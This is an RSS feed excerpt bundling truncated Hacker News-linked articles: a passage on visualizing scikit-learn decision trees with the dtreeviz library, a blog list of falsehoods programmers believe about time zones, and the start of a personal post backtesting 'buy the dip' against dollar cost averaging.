<a href="https://explained.ai/decision-tree-viz/images/dtreeviz_leaves_4.png">
<img src="https://explained.ai/decision-tree-viz/images/dtreeviz_leaves_4.png" width="150%" url="images/dtreeviz_leaves_4.png">
</a>
</center>

</center>

</td>
</tr>
</tbody>
</table>
</center>
<hr>


<p>Decision trees are the fundamental building block of <a href="http://explained.ai/gradient-boosting/index.html">gradient boosting machines</a> and <a href="https://en.wikipedia.org/wiki/Random_forest">Random Forests</a>™, probably the two most popular machine learning models for structured data.  Visualizing decision trees is a tremendous aid when learning how these models work and when interpreting models.  Unfortunately, current visualization packages are rudimentary and not immediately helpful to the novice. For example, we couldn't find a library that visualizes how decision nodes split up the feature space. It is also uncommon for libraries to support visualizing a specific feature vector as it weaves down through a tree's decision nodes; we could only find one image showing this.</p>

<p>So, we've created a general package for <a href="https://github.com/scikit-learn/scikit-learn">scikit-learn</a> decision tree visualization and model interpretation, which we'll be using heavily in an upcoming <a href="https://mlbook.explained.ai/">machine learning book</a> (written with <a href="http://www.fast.ai/about/#jeremy">Jeremy Howard</a>).  Here's a sample visualization for a tiny decision tree (click to enlarge):</p>

<p><a href="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg" width="70%"></a></p>

<p>This article demonstrates the results of this work, details the specific choices we made for visualization, and outlines the tools and techniques used in the implementation. The visualization software is part of a nascent Python machine learning library called <a href="https://github.com/parrt/dtreeviz">dtreeviz</a>.  We assume you're familiar with the basic mechanism of decision trees if you're interested in visualizing them, but let's start with a brief summary so that we're all using the same terminology. (If you're not familiar with decision trees, check out <a href="http://course.fast.ai/ml">fast.ai's Introduction to Machine Learning for Coders MOOC</a>.)</p>



<h2 id="sec:1.1">1.1 Decision tree review</h2>


<p>A decision tree is a machine learning model based upon binary trees (trees with at most a left and right child).  A decision tree learns the relationship between observations in a training set, represented as feature vectors <span>x</span> and target values <span>y</span>, by examining and condensing training data into a binary tree of interior nodes and leaf nodes.  (Notation: vectors are in bold and scalars are in italics.)</p>

<p>Each leaf in the decision tree is responsible for making a specific prediction. For regression trees, the prediction is a value, such as price.  For classifier trees, the prediction is a target category (represented as an integer in scikit), such as cancer or not-cancer. A decision tree carves up the feature space into groups of observations that share similar target values and each leaf represents one of these groups.  For regression, similarity in a leaf means a low variance among target values and, for classification, it means that most or all targets are of a single class.</p>

<p>Any path from the root of the decision tree to a specific leaf predictor passes through a series of (internal) decision nodes. Each decision node compares a single feature's value in <span>x</span>, <span>x<sub>i</sub></span>, with a specific <i>split point</i> value learned during training. For example, in a model predicting apartment rent prices, decision nodes would test features such as the number of bedrooms and number of bathrooms. (See <b>Section 1.5.3</b> <i>Visualizing tree interpretation of a single observation</i>.) Even in a classifier with discrete target values, decision nodes still compare numeric <i>feature</i> values because scitkit's decision tree implementation assumes that all features are numeric. Categorical variables must be <a href="https://machinelearningmastery.com/how-to-one-hot-encode-sequence-data-in-python/">one hot encoded</a>, <a href="https://www.analyticsvidhya.com/blog/2015/11/easy-methods-deal-categorical-variables-predictive-modeling/">binned</a>, <a href="http://forums.fast.ai/t/to-label-encode-or-one-hot-encode/6057">label encoded</a>, etc... </p>

<p>To train a decision node, the model examines a subset of the training observations (or the full training set at the root). The node's feature and split point within that feature space are chosen during training to split the observations into left and right buckets (subsets) to maximize similarity as defined above. (This selection process is generally done through exhaustive comparison of features and  feature values.) The left bucket has observations whose <span>x<sub>i</sub></span> feature values are all less than the split point and the right bucket has observations whose <span>x<sub>i</sub></span> is greater than the split point.   Tree construction proceeds recursively by creating decision nodes for the left bucket and the right bucket.  Construction stops when some stopping criterion is reached, such as having less than five observations in the node.</p>



<h2 id="sec:1.2">1.2 The key elements of decision tree visualization</h2>


<p>Decision tree visualizations should highlight the following important elements, which we demonstrate below.</p>
<ul>
<li>Decision node <b>feature versus target value</b> distributions (which we call feature-target space in this article). We want to know how separable the target values are based upon the feature and a split point.</li>
<li>Decision node <b>feature name and feature split value</b>.  We need to know which feature each decision node is testing and where in that space the nodes splits the observations.</li>
<li><b>Leaf node purity</b>, which affects our prediction confidence. Leaves with low variance among the target values (regression) or an overwhelming majority target class (classification) are much more reliable predictors.</li>
<li><b>Leaf node prediction value</b>.  What is this leaf actually predicting from the collection of target values?</li>
<li><b>Numbers of samples in decision nodes</b>.  Sometimes it's useful to know where all most of the samples are being routed through the decision nodes.</li>
<li><b>Numbers of samples in leaf nodes</b>.  Our goal is a decision tree with fewer, larger and purer leaves. Nodes with too few samples are possible indications of overfitting.</li>
<li>How a specific feature vector is <b>run down the tree</b> to a leaf. This helps explain why a particular feature vector gets the prediction it does. For example, in a regression tree predicting apartment rent prices, we might find a feature vector routed into a high predicted price leaf because of a decision node that checks for more than three bedrooms.</li>
</ul>


<h2 id="sec:1.3">1.3 Gallery of decision tree visualizations</h2>


<p>Before digging into the previous state-of-the-art visualizations, we'd like to give a little spoiler to show what's possible. This section highlights some samples visualizations we built from scikit regression and classification decision trees on a few data sets. You can also check out the	<a href="https://github.com/parrt/dtreeviz/tree/master/testing/samples">full gallery</a> and <a href="https://github.com/parrt/dtreeviz/blob/master/testing/gen_samples.py">code to generate all samples</a>.</p>
<center>
<table>
<thead>
<tr>
<th></th><th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_wine.html#sklearn.datasets.load_wine">Wine</a> 3-class top-down orientation</td><td><a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_breast_cancer.html#sklearn.datasets.load_breast_cancer">Breast cancer</a> 2-class left-to-right</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/breast_cancer-LR-3.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/breast_cancer-LR-3.svg" width="100%"></a></td>
</tr>
<tr>
<td><a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_iris.html#sklearn.datasets.load_iris">Iris</a> 3-class showing a prediction</td><td><a href="https://archive.ics.uci.edu/ml/datasets/User+Knowledge+Modeling">User knowledge rating</a> 4-class</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/samples/iris-TD-3-X.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/iris-TD-3-X.svg" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/knowledge-LR-3.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/knowledge-LR-3.svg" width="100%"></a></td>
</tr>
<tr>
<td><a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_digits.html#sklearn.datasets.load_digits">Digits</a> 10-class</td><td><a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_diabetes.html">Diabetes</a> showing a prediction</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/samples/digits-LR-3.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/digits-LR-3.svg" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/diabetes-TD-3-X.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/diabetes-TD-3-X.svg" width="100%"></a>	</td>
</tr>
<tr>
<td><a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_boston.html">Boston</a> showing a prediction</td><td><a href="http://mldata.org/repository/data/viewslug/ratings-of-sweets-sweetrs/">Sweets</a> showing a prediction</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/samples/boston-TD-3-X.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/boston-TD-3-X.svg" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/sweets-TD-3-X.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/sweets-TD-3-X.svg" width="100%"></a></td>
</tr>
<tr>
<td>User knowledge rating 4-class non-fancy</td><td>Diabetes non-fancy</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/samples/knowledge-TD-15-X-simple.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/knowledge-TD-15-X-simple.svg" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/boston-LR-5-X-simple.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/boston-LR-5-X-simple.svg" width="80%"></a></td>
</tr>
</tbody>
</table>
</center>	


<h2 id="sec:1.4">1.4 A comparison to previous state-of-the-art visualizations</h2>


<p>If you search for “visualizing decision trees” you will quickly find a <b>Python</b> solution provided by the awesome scikit folks: <a href="http://scikit-learn.org/stable/modules/generated/sklearn.tree.export_graphviz.html">sklearn.tree.export_graphviz</a>.  With more work, you can find visualizations for <a href="http://scikit-learn.org/stable/modules/tree.html">R</a> and even <a href="http://support.sas.com/documentation/cdl/en/vaug/68027/HTML/default/viewer.htm#n0q3i0zwng79kin1kb1zvpo9k312.htm">SAS</a> and <a href="https://www.ibm.com/support/knowledgecenter/en/SS4QC9/com.ibm.solutions.wa_an_overview.2.0.0.doc/wa_discover_viz_expl_insigths_dec_tree.html">IBM</a>. In this section, we collect the various decision tree visualizations we could find and compare them to the visualizations made by our <span>dtreeviz</span> library. We give a more detailed discussion of our visualizations in the next section.</p>

<p>Let's start with the <a href="http://scikit-learn.org/stable/modules/tree.html">default scitkit visualization</a> of a decision tree on the well-known <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_iris.html#sklearn.datasets.load_iris">Iris</a> data set (click on images to enlarge).</p>
<center>
<table>
<thead>
<tr>
<th></th><th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Default scikit Iris visualization</td><td>Our <span>dtreeviz</span> Iris visualization</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/iris-scikit.png"><img src="https://explained.ai/decision-tree-viz/images/iris-scikit.png" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/iris-TD-5.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/iris-TD-5.svg" width="100%"></a></td>
</tr>
</tbody>
</table>
</center>
<p>The scikit tree does a good job of representing the tree structure, but we have a few quibbles.  The colors aren't the best and it's not immediately obvious why some of the nodes are colored and some aren't.  If the colors represent predicted class for this classifier, one would think just the leaves would be colored because only leaves have predictions. (It turns out the non-colored nodes have no majority prediction.) Including the gini coefficient (certainty score) costs space and doesn't help with interpretation. The count of samples of the  various target classes in each node is somewhat useful, but a histogram would be even better. A target class color legend would be nice.  Finally, using true and false as the edge labels isn't as clear as, say, labels <img src="https://explained.ai/decision-tree-viz/images/eqn-524A50782178998021A88B8CD4C8DCD8-depth000.51.svg"> and <img src="https://explained.ai/decision-tree-viz/images/eqn-4EDC933D28BFE3F5EFFE94BF892DAD38-depth001.72.svg">. The most obvious difference is that our decision nodes show feature distributions as overlapping stacked-histograms, one histogram per target class. Also, our leaf size is proportional to the number of samples in that leaf.</p>

<p>Scikit uses the same visualization approach for decision tree regressors. For example, here is scikit's visualization using the <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_boston.html">Boston</a> data set, with <span>dtreeviz</span>'s version for comparison (click to enlarge images):</p>
<center>
<table>
<thead>
<tr>
<th></th><th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Default scikit Boston visualization</td><td>Our <span>dtreeviz</span> Boston visualization</td>
</tr>
<tr>
<td><a href="https://explained.ai/decision-tree-viz/images/boston-scikit.png"><img src="https://explained.ai/decision-tree-viz/images/boston-scikit.png" width="100%"></a></td><td><a href="https://explained.ai/decision-tree-viz/images/samples/boston-TD-3.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/boston-TD-3.svg" width="100%"></a></td>
</tr>
</tbody>
</table>
</center>
<p>In the scikit tree, it's not immediately clear what the use of color implies, but after studying the image, darker images indicate higher predicted target values. As before, our decision nodes show the feature space distribution, this time using a feature versus target value scatterplot.  The leaves use strip plots to show the target value distribution; leaves with more dots naturally have a higher number of samples.</p>

<p><b>R</b> programmers also have access to a package for <a href="http://blog.revolutionanalytics.com/2013/06/plotting-classification-and-regression-trees-with-plotrpart.html">visualizing decision trees</a>, which gives similar results to scikit but with nicer edge labels:</p>

<p><a href="https://explained.ai/decision-tree-viz/images/R-tree.png"><img src="https://explained.ai/decision-tree-viz/images/R-tree.png" width="40%"></a></p>

<p><b>SAS</b> and <b>IBM</b> also provide (non-Python-based) decision tree visualizations.  Starting with SAS, we see that their decision nodes include a bar chart related to the node's …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://explained.ai/decision-tree-viz/">https://explained.ai/decision-tree-viz/</a></em></p>]]>
            </description>
            <link>https://explained.ai/decision-tree-viz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870390</guid>
            <pubDate>Fri, 23 Oct 2020 15:20:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Falsehoods programmers believe about time zones]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 13 (<a href="https://news.ycombinator.com/item?id=24870376">thread link</a>) | @Gedxx
<br/>
October 23, 2020 | https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/ | <a href="https://web.archive.org/web/*/https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<!-- .cover -->


				<div>
					<p>My aunt has a problem</p><p>She loves joining Zoom meetings, but they're all hosted in different time zones. It's hard to remember if she should add 4 hours, subtract 3, or what. She's not the most technical person, so google isn't an option. She has to ask for help.</p><p>Every. Single. Time.</p><p>And, for the less technically minded, it's also error-prone.</p><p>Last a couple weeks ago I thought:</p><p>What if event organizers could share a link that would do the work for you? If someone clicked on <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/mytime.io/5pm/EST">mytime.at/5pm/EST</a>, they would see their local version of that time. It sounded simple enough.</p><p>I began coding. </p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-5.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-5.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-5.png 699w"><figcaption>I later discovered mytime.io had already implemented a very similar thing, and run into the same pitfalls</figcaption></figure><p>I knew trying to manage time <a href="https://www.youtube.com/watch?v=-5wpm-gesOY">is a fool's errand</a>, but that's what datetime libraries are for. I would merely build an extra time zone conversion layer on top.</p><p>Surely that couldn't be complicated</p><p>...Right?</p><p>I soon discovered just how wrong I was. One after another, I kept learning the falsehood of yet another "fact" that had seemed obviously true. Eventually my original vision became literally impossible to pull off without making serious compromises (more about that in a future blog post).</p><p>Hopefully this list will help you avoid the landmines I stepped on. All the falsehoods below are ones I'd considered true at some point in my adult life. </p><p>Most of them I believed just one month ago.</p><h3 id="misconception-1-utc-offsets-go-from-12-to-12"><strong>Misconception #1: UTC offsets go from -12 to +12</strong></h3><p>Turns out, UTC offsets span from -12 to +14. Yeah, +14. That's gives you 27 hours UTC can be offset by (don't forget the zero offset)</p><p>How does it work? UTC-12 has the same time as UTC+12, but is one day behind. Same goes for UTC-11 and UTC+13, etc.</p><p>Why that crazy range? That was a result of pacific islanders decided they wanted to be on a specific side of the international date line. </p><p>It makes for a very jagged international date line</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png" alt="" srcset="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png 600w"></figure><h3 id="misconception-2-every-utc-offset-corresponds-to-exactly-one-time-zone">Misconception #2: Every UTC offset corresponds to exactly one time zone</h3><p>Here are 10 distinct time zones which are all at UTC+5:</p><ul><li>Aqtobe Time</li><li>Mawson Time</li><li>Maldives Time</li><li>Oral Time</li><li>Pakistan Standard Time</li><li>French Southern and Antarctic Time</li><li>Tajikistan Time</li><li>Turkmenistan Time</li><li>Uzbekistan Time</li><li>Yekaterinburg Time</li></ul><p>You might be wondering: if they’re all at the same UTC offset, why couldn’t all those countries just use the same time zone? Perhaps Pakistanis weren’t keen about being on “Yekaterinburg Time”</p><h3 id="misconception-3-there-are-more-countries-in-the-world-than-time-zones">Misconception #3: <strong>There are more countries in the world than time zones</strong></h3><p>How could this one possibly be wrong? Well...</p><ol><li>Many countries want their very own time zone (how many do you think run on Myanmar Time?)</li><li>Some countries split themselves up into multiple time zones (e.g. eastern and western times)</li><li>Military time alone uses 25 time zones, one for each hour from UTC-12 to UTC+12</li><li>DST. More on this one below</li></ol><p>All together, there are<a href="https://www.timeanddate.com/time/zones/"> 244 time zones</a> used by the 195 countries in the world.</p><h3 id="misconception-4-every-time-zone-has-exactly-one-agreed-upon-name">Misconception #4: <strong>Every time zone has exactly one agreed upon name</strong></h3><p>Ever notice how every time zone consists only of English words? Awfully kind of Spanish and French speaking countries to graciously use our language, right?</p><p>Hah, Yeah right. </p><p>Eastern Standard Time, Tiempo del Este, and Heure Normale de l'Est are all different names for the exact same time zone.</p><p>Have fun coding that into your library.</p><h3 id="misconception-5-time-zones-are-always-offset-from-utc-by-an-integer-number-of-hours">Misconception #5: <strong>Time zones are always offset from UTC by an integer number of hours</strong></h3><p>India standard time is five and a half hours off of UTC. There are many more examples</p><h3 id="misconception-6-fine-time-zones-are-always-offset-from-utc-by-an-integer-number-of-half-hours">Misconception #6: <strong>Fine, time zones are always offset from UTC by an integer number of half-hours</strong></h3><p>Nepal likes to be at the 45 minute UTC offset.</p><p>Why does that extra 15 minutes matter so much to them? Because<a href="https://www.bbc.com/news/world-asia-33815153#:~:text=Nepal%20is%205%20hours%20and,a%20mountain%20east%20of%20Kathmandu.&amp;text=It%20gets%20trickier%20in%20the,t%20officially%20have%20time%20zones."> they really want</a> their mountain to have the sun right above it at noon.</p><p>But it makes you wonder: what would happen if the mountain ever shifted?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/mountain-moved-3.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/mountain-moved-3.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/mountain-moved-3.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/mountain-moved-3.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/mountain-moved-3.jpeg 2126w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-7-a-country-stays-at-the-same-utc-offset-all-year-long">Misconception #7: <strong>A country stays at the same UTC offset all year long</strong></h3><p>Don't forget about Daylight Saving Time! Or as the Europeans call it "Summer Time." &nbsp;</p><p>Countries practicing DST change their UTC offset twice every year.</p><h3 id="misconception-8-there-is-a-standard-format-for-declaring-time-zones">Misconception #8: <strong>There is a standard format for declaring time zones</strong></h3><p>Hah, I wish. Here are some standards I discovered, there may be more:</p><h4 id="common-name">Common name</h4><p>These are the traditional time zone names we’re used to. Example: Pacific Standard Time.</p><p>But I don't know if there's an official term for these names, they just that unstandardized.</p><h4 id="iana-zone-keys">IANA zone keys</h4><p>This is as close to the official standard as you can get. It's not at all official, but it's something the developer community has rallied around.</p><p>It's a <a href="https://www.iana.org/time-zones">painstakingly maintained database</a> which contains all known time zone data representing the entire history of local time for places around the globe. &nbsp;It doesn't give any zone a name though, preferring to use the name of the most prominent city in there, which leads to:</p><h4 id="prominent-city-based">Prominent city based</h4><p>This one is "<a href="https://twitter.com/pganssle/status/1319794747876253697">basically bad UI that derives from the IANA zone keys</a>"</p><p>Full time zone names come with naming complications, which we discussed above. If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates. This lets them define any moment unambiguously and not have to worry about Daylight Saving Time.</p><p>If you squint your eyes a bit, you could consider this a fourth standard.</p><h3 id="misconception-9-daylight-saving-time-starts-at-the-same-time-every-year">Misconception #9: <strong>Daylight Saving Time starts at the same time every year</strong></h3><p>Did you think this would be the one thing world powers agree on? Each country choose when to start it's own DST</p><h3 id="misconception-10-a-country-s-time-zone-never-changes">Misconception #10: <strong>A country's time zone never changes</strong></h3><p>Almost every year some country will pass a law to edit their time zone.</p><p>In a particularly memorable example, a few years ago the Samoan islands wanted to be on the other side of the international date line to get the same weekends as their Australian trading partners. So on midnight Dec 29th, they changed their UTC offset from -11 to +13 UTC, skipping Dec 30th and going straight to Dec 31st.</p><p>Samoan citizens had one less day to celebrate the holidays that year.</p><p>On the plus side, just 40 miles away the American Samoa Islands stayed on the other side of the international date line. Now Samoans can celebrate new years on the Western Island, and then boat over to American Samoa for a second new year’s party the next night.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/pasted-image-0--2-.png 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/pasted-image-0--2-.png 1000w, https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png 1169w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-11-a-country-stays-in-the-same-time-zone-during-daylight-saving-time">Misconception #11: <strong>A country stays in the same time zone during Daylight Saving Time</strong></h3><p>Funny thing about DST, it doesn't actually change the time zone's UTC offset. &nbsp;Instead, Daylight Saving Time countries switch to a different time zone, with a different name.</p><p>For example:</p><p>Texas goes from Central Standard Time to Central Daylight Time.</p><p>Chile goes from Chile Standard Time to Chile Summer Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/dst-shift.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/dst-shift.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/dst-shift.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg 2168w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-12-daylight-saving-time-starts-around-march-and-ends-around-october">Misconception #12: <strong>Daylight Saving Time starts around March and ends around October</strong></h3><p>The Southern hemisphere has their summer in the other half of the year. The pattern flips.</p><h3 id="misconception-13-every-time-zone-has-it-s-own-name">Misconception #13: <strong>Every time zone has it’s own name</strong></h3><p>Which country should get to claim "Eastern Standard Time"?</p><p>North America claimed dibs by virtue of inventing the name, but do you think no one objected? Australia thought it sounded like a fine name to use, and so even though the rest of the world refer to their time zone as Australian Eastern Standard Time, it's own citizens just call it "Eastern Standard Time".</p><h3 id="misconception-14-every-time-zone-has-its-own-abbreviation">Misconception #14: <strong>Every time zone has its own abbreviation</strong></h3><p>Which of these was meant when someone says CST?</p><ul><li>Central Standard Time</li><li>China Standard Time</li><li>Cuba Standard Time</li></ul><p>And remember how the time zone name changes during Daylight Saving Time? Many people don’t know that and keep using the wrong abbreviations during DST months. CST might be used for Central Daylight Time.</p><p>If there's no standard name for time zones, can you really expect one for the abbreviations?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/fake-franks.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/fake-franks.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/fake-franks.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/fake-franks.jpeg 1020w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-15-there-is-always-an-unambiguous-conversion-from-one-time-zone-to-another">Misconception #15: <strong>There is always an unambiguous conversion from one time zone to another</strong></h3><p>If I say I want to convert 5pm Eastern Standard Time to Pakistan Standard Time, <s>am I talking about the American or Australian Eastern Standard Time?</s> (Aussies <a href="https://www.reddit.com/r/programming/comments/jggx3l/falsehoods_programmers_believe_about_time_zones/g9qv6cc/">are claiming</a> they say the full Australian Eastern Standard Time)</p><p>And is Daylight Saving Time in effect or not?</p><p>Okay, it’s tricky. But surely if we include the date and the exact city, then we'd be able to do the conversion reliably, right?</p><p>What if the date and time are 1:30 am on Nov 1st, 2020, right when US DST ends and the clock moves backwards?</p><p>1:30am occurs twice that morning, how do you know which instance was intended?</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/deja-vu.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/deja-vu.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/deja-vu.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/deja-vu.jpeg 1474w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-16-your-time-zone-library-can-recognize-any-time-zone-you-are-using-a-library-for-this-right-">Misconception #16: <strong>Your time zone library can recognize any time zone (you are using a library for this, right?)</strong></h3><p>Remember all those different potential time zone names and formats? Most libraries will only support one.</p><p>And they might be limited by the time zones installed on your local machine.</p><p>Yeah, really.</p><p>Remember, if time zones can change based on the whims of a local government, then the library will need some external dataset to base its calculations off of. That external dataset just might be the time zones installed on your PC.</p><h3 id="misconception-17-the-entire-country-always-shifts-during-daylight-saving-time">Misconception #17: <strong>The entire country always shifts during Daylight Saving Time</strong></h3><p>In the US, Arizona doesn't practice Daylight Saving Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/arizona-dst.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/arizona-dst.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/arizona-dst.jpeg 1000w, https://www.zainrizvi.io/content/images/2020/10/arizona-dst.jpeg 1575w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-18-the-entire-state-always-shifts-during-daylight-saving-time">Misconception #18: <strong>The entire state always shifts during Daylight Saving Time</strong></h3><p>Within Arizona, the Navajo Nation happily follows Daylight Saving Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/navajo-nation.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/navajo-nation.jpeg 600w, https://www.zainrizvi.io/content/images/2020/10/navajo-nation.jpeg 760w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-19-other-than-dst-every-city-within-a-state-follows-the-same-time-zone">Misconception #19: <strong>Other than DST, every city within a state follows the same time zone</strong></h3><p>In Indiana, USA, most cities follow Eastern Standard Time but a few decided to follow Central Standard Time</p><h3 id="misconception-20-every-city-sits-within-exactly-one-time-zone">Misconception #20: <strong>Every city sits within exactly one time zone</strong></h3><p>A few times in history, state line or time zone lies got drawn without …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/">https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/</a></em></p>]]>
            </description>
            <link>https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870376</guid>
            <pubDate>Fri, 23 Oct 2020 15:18:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Should I Buy the Dip?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24870336">thread link</a>) | @carlosbaraza
<br/>
October 23, 2020 | https://carlosbaraza.com/should-i-buy-the-dip/ | <a href="https://web.archive.org/web/*/https://carlosbaraza.com/should-i-buy-the-dip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>For quite some time I've been monitoring the markets, and waiting for a dip to invest my cash. However, a few weeks ago I decided to put this assumption to the test. Is buying the dip the best I could do with my hard earned cash?</p><ul><li>Like most employees, I have a salary and some yearly disposable income to dedicate to my long term savings or investments. Concretely, I have about <strong>£20000 a year to dedicate to my investments</strong>.</li><li>I decided to <strong>invest only on indexes</strong>, because I got burned with individual stocks (and crypto) multiple times (a.k.a. I am a terrible investor).</li><li><strong>Long term investments only</strong>. Monitoring the market daily/hourly is a massive drain of energy and time that I could dedicate to generate more cash to invest.</li></ul><ul><li>Buy daily same amount (Hardcore <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy monthly same amount (Simple <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy yearly same amount (Extremely simple <a href="https://www.investopedia.com/terms/d/dollarcostaveraging.asp">dollar cost averaging strategy</a>)</li><li>Buy the dip (My own <em>shitty-wait-for-it-and-spend-shit-tons-of-time-monitoring strategy</em>)</li></ul><p>I used Python + <a href="https://github.com/mementum/backtrader">Backtrader library</a> to simulate my scenarios, and these were the results investing on the SPY ETF, ignoring commission fees because my broker offers zero commission transactions.</p><figure><img src="https://carlosbaraza.com/content/images/2020/10/index-strategies.jpg"></figure><p>This experiment was quite revealing for me, because it showed me that the return of investment (ROI) for spending 27 years monitoring the markets daily could easily be negative, compared with a hands-off strategy like dollar cost averaging monthly to the SPY.</p><p>If previous return history is an indicative of future returns, the extra time dedicated to monitoring the market without a clear edge is a waste of time, which is also a waste of money.</p><p><strong>The main takeaway is don't try to beat the market, just invest at set intervals on some diversified indexes, and don't look back, regardless of what the market does. Spend the extra time generating more cash to invest, and 